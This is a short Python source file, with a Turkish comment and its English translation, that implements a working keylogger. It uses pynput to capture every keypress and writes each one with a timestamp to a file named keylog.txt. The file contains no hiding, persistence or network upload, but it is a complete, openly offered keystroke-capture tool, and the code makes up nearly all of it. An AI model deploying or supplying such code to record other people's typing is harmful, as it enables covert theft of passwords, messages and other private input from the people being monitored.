# Bu proje, kullanıcının yaptığı tüm klavye girdilerini kaydeden bir program oluşturmayı içerir.
# (This project involves creating a program that records all keyboard inputs made by the user.)

from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener :
    listener.join()